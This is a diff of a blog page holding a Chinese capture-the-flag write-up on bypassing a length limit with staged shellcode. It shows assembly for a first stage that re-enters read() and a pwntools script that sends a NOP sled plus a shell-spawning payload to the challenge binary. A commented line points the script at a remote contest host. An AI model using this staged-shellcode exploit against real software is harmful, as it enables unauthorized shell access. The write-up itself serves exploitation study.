@@ -19,7 +19,7 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"summ2.link","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.23.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":"mac","style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeIn","post_block":"fadeIn","post_header":"fadeIn","post_body":"fadeIn"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"summ2.link","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.23.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":false,"copycode":{"enable":"mac","style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeIn","post_block":"fadeIn","post_header":"fadeIn","post_body":"fadeIn"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
 
     <meta name="description" content="shellcode  shellcode 是一段用于利用软件漏洞而执行的代码，shellcode 为 16 进制之机械码，以其经常让攻击者获得 shell 而得名。shellcode 常常使用机器语言编写。">
 <meta property="og:type" content="article">
@@ -305,7 +305,11 @@
 <code>r8</code> 中存有 <code>syscall</code>
 指令的地址，我的一个想法是控制寄存器 <code>rax</code>, <code>rdi</code>,
 <code>rsi</code>, <code>rdx</code> 执行系统调用 <code>read</code>。</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rsi,rax</span><br><span class="line">xor rax,rax</span><br><span class="line">xor rdi,rdi</span><br><span class="line">add rdx,0x50</span><br><span class="line">call r8</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="highlight assembly">mov rsi,rax
+xor rax,rax
+xor rdi,rdi
+add rdx,0x50
+call r8</code></pre>
 <p>不过这样的长度已经超出 0xa 的限制了。后面我又想了很久，想继续利用
 <code>r8</code> 跳转到某个 <code>main</code> 函数上的指令，调试发现从
 <code>r8</code> 到一个 <code>main</code>
@@ -324,13 +328,47 @@
 rax 执行 shellcode，返回地址存在栈顶</figcaption>
 </figure>
 <h3 id="第一段-shellcode">第一段 shellcode</h3>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pop rdx; 返回地址出栈</span><br><span class="line">pop rdi; fd</span><br><span class="line">pop rsi; 将不需要的数据出栈</span><br><span class="line">pop rsi; *buf &lt;- shellcode address</span><br><span class="line">sud rdx,0x41; 减去偏移，结果为 &lt;main+00f1&gt;</span><br><span class="line">call rdx</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="highlight assembly">pop rdx; 返回地址出栈
+pop rdi; fd
+pop rsi; 将不需要的数据出栈
+pop rsi; *buf &lt;- shellcode address
+sud rdx,0x41; 减去偏移，结果为 &lt;main+00f1&gt;
+call rdx</code></pre>
 <p>将程序跳转到 <code>main</code> 函数的 <code>call _read</code> 前:</p>
 <p><img src="/2024113-shellcode---有长度限制的shellcode解法\image-20241103174318078.png"></p>
 <h2 id="执行-shellcode">执行 shellcode</h2>
 <p>没有了读入限制后，直接使用 pwntool 生成的 shellcode 即可。</p>
 <h1 id="exploit">Exploit</h1>
-<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">p = process(<span class="string">"./shellcode1"</span>)</span><br><span class="line"><span class="comment">#p = remote("139.155.126.78", "38681")</span></span><br><span class="line">shellcode = <span class="string">"""</span></span><br><span class="line"><span class="string">pop rdx;</span></span><br><span class="line"><span class="string">pop rdi;</span></span><br><span class="line"><span class="string">pop rsi;</span></span><br><span class="line"><span class="string">pop rsi;</span></span><br><span class="line"><span class="string">sub rdx, 0x41;</span></span><br><span class="line"><span class="string">call rdx;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendafter(<span class="string">b"input"</span>, asm(shellcode))</span><br><span class="line">shellcode = <span class="string">"""</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">"""</span> <span class="comment">#10个nop，因为下次执行的地址是在shellcode1的结尾(call rdx)</span></span><br><span class="line">shellcode += shellcraft.sh()</span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="highlight python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
+context.log_level = <span class="string">"debug"</span>
+context.arch = <span class="string">"amd64"</span>
+p = process(<span class="string">"./shellcode1"</span>)
+<span class="comment">#p = remote("139.155.126.78", "38681")</span>
+shellcode = <span class="string">"""</span>
+<span class="string">pop rdx;</span>
+<span class="string">pop rdi;</span>
+<span class="string">pop rsi;</span>
+<span class="string">pop rsi;</span>
+<span class="string">sub rdx, 0x41;</span>
+<span class="string">call rdx;</span>
+<span class="string">"""</span>
+gdb.attach(p)
+p.sendafter(<span class="string">b"input"</span>, asm(shellcode))
+shellcode = <span class="string">"""</span>
+<span class="string">nop;</span>
+<span class="string">nop;</span>
+<span class="string">nop;</span>
+<span class="string">nop;</span>
+<span class="string">nop;</span>
+<span class="string">nop;</span>
+<span class="string">nop;</span>
+<span class="string">nop;</span>
+<span class="string">nop;</span>
+<span class="string">nop;</span>
+<span class="string">"""</span> <span class="comment">#10个nop，因为下次执行的地址是在shellcode1的结尾(call rdx)</span>
+shellcode += shellcraft.sh()
+p.send(asm(shellcode))
+p.interactive()</code></pre>
 <h1 id="小结">小结</h1>
 <p>这回的省赛属于是坐了四小时大牢了。每道题目或者是在现实实践中，自然是与之前遇到的情况会有不同。因此对程序动态运行中的各种状态应该敏锐一些，例如栈、寄存器，可能会有发现。</p>
 
